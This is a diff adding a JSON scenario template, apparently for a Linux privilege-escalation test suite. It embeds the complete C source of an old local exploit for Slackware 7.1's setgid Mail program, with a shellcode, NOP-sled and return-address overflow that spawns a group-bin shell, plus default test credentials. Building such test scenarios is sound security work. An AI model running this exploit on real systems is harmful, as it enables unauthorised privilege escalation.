@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_285",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Slackware 7.1 - '/usr/bin/mail' Local Privilege Escalation\n\nExploit source code (285.c):\n```\n/*\n   Slackware 7.1 /usr/bin/Mail Exploit give gid=1 ( bin )\n   if /usr/bin/Mail is setgid but it is not setgid,\n   setuid for default.\n\n  tested on my box ( sl 7.1 )\n  crazy exploited by kengz.\n  GID.... \\x01 = 1 (bin)\n          \\x02 = 2 ,\n          \\x03 = 3 ,\n     ...  \\x0a = 10\n          \\x0b = 11\n    ....\n*/\n\n#include <stdio.h>\n#include <string.h>\n#define GID    \"\\x03\"\n\nint main(int argc, char **argv) {\n  char shellcode[] =\n    \"\\x31\\xdb\\x31\\xc9\\xbb\\xff\\xff\\xff\\xff\\xb1\"GID\"\\x31\"\n    \"\\xc0\\xb0\\x47\\xcd\\x80\\x31\\xdb\\x31\\xc9\\xb3\"GID\"\\xb1\"\n     GID\"\\x31\\xc0\\xb0\\x47\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\"\n    \"\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\"\n    \"\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\"\n    \"\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n\n  char buf2[10000];\n  char buffer[15000];\n  char nop[8000];\n  char *p, *q;\n  long ret=0xbfffffff;\n  int len, offset = 0, i,j,k,ii;\n  ret = ret - 5000;\n\n  for(k=0; k<2000; k+=4)\n    *(long *)&buf2[k] = ret;\n\n  for(k=0;k<7000;k++){\n    strcat(nop,\"\\x90\");\n  }\n  snprintf(buffer,12000,\"%s%s%s\",nop,shellcode,buf2);\n  printf(\"Crazy Mail sploit by kengz \\n\");\n  printf(\"Hit    '  .  ' to go \\n\");\n  execl(\"/usr/bin/Mail\",\"Mail\",\"x\",\"-s\",\"x\",\"-c\",buffer,0);\n}\n\n\n// milw0rm.com [2001-03-03]\n```",
+  "cve": "",
+  "exploitdb_id": "285",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_285",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
